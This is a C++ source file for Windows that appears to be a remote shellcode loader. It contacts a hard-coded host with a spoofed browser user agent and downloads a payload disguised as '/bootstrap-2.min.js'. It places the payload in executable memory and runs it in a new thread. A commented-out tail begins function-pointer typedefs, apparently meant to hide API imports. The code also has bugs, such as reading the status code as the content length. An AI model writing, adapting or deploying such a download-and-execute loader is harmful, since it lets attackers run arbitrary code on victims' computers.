//#include <iostream>
#include <Windows.h>
#include <stdio.h>
#include <WinInet.h>
//using namespace std;
#pragma comment(lib,"wininet")
int main(int argc,char* argv[]){
    //if (argc > 1) {
        HINTERNET nethandle = InternetOpenA("Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",INTERNET_OPEN_TYPE_DIRECT,NULL,NULL, INTERNET_FLAG_ASYNC);
        if (nethandle == NULL) {
            printf("internet open error:%d\n", GetLastError());
            return 0;
        }
        char* host = (char*)"192.168.211.129";
        HINTERNET Session = InternetConnectA(nethandle, host, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (Session==NULL)
        {
            printf("internet connect error:%d\n", GetLastError());
            return 0;
        }
        HINTERNET HttpRequest = HttpOpenRequestA(Session, "GET", "/bootstrap-2.min.js", "HTTP/1.0", NULL, NULL, INTERNET_FLAG_DONT_CACHE, 0);
        if (HttpRequest == NULL) {
            printf("http open request error:%d\n", GetLastError());
            return 0;
        }
        int ret = HttpSendRequestA(HttpRequest, NULL, 0, NULL, 0);
        if (ret == FALSE) {
            printf("http send request error:%d\n", GetLastError());
            return 0;
        }
        char* statscode[16] = { 0 };
        int size = 16;
        ret = HttpQueryInfoA(HttpRequest, HTTP_QUERY_STATUS_CODE, statscode, (LPDWORD)&size, NULL);
        if (ret == FALSE) {
            printf("httpqueryinfo error:%d\n", GetLastError());
            return 0;
        }
        int scode = atoi((const char*)statscode);
        printf("code:%d\n", scode);
        if (scode != HTTP_STATUS_OK && scode != HTTP_STATUS_CREATED) {
            printf("%d please retry\n", scode);
            return 0;
        }
        char* contentL[16] = { 0 };
        size = 16;
        ret = HttpQueryInfoA(HttpRequest, HTTP_QUERY_STATUS_CODE, contentL, (LPDWORD)&size, NULL);
        int length = atoi((const char*)contentL);
        //cout << "length:" << length << "\n";
        if (ret == FALSE) {
            printf("htttpqueryinfo error:%d\n", GetLastError());
            return 0;
        }
        void* c = VirtualAlloc(NULL, length + 1, MEM_DECOMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        int readed = 0;
        InternetReadFile(HttpRequest, c, length + 1, (LPDWORD)&readed);
        char* cc = (char*)c + 10;
        HANDLE ct = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)cc, NULL, 0, NULL);
        WaitForSingleObject(ct, INFINITE);
        VirtualFree(c, length + 1, MEM_DECOMMIT);
    /*}
    else {
        printf("hello world\n");
    }
    return 0;*/
}
/*
#include <iostream>
#include <Windows.h>
#include <stdio.h>
#include <Wininet.h>

using namespace std;
#pragma comment(lib,"wininet")
typedef _Ret_maybenull_ _Post_writable_byte_size_(dwSize) LPVOID(WINAPI* PVA)(
    _In_opt_ LPVOID lpAddress,
    _In_     SIZE_T dwSize,
    _In_     DWORD flAllocationType,
    _In_     DWORD flProtect,
    );

typedef WINBASEAPI _Ret_maybenull_ HANDLE(WINAPI* PCT)(
    _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
    _In_     SIZE_T dwStackSize,
    _In_     LPTHREAD_START_ROUTINE lpStartAddress,
    _In_opt_ __drv_aliasesMem LPVOID lpParameter,
    _In_     DWORD dwCrationFlags,
    
    );


    */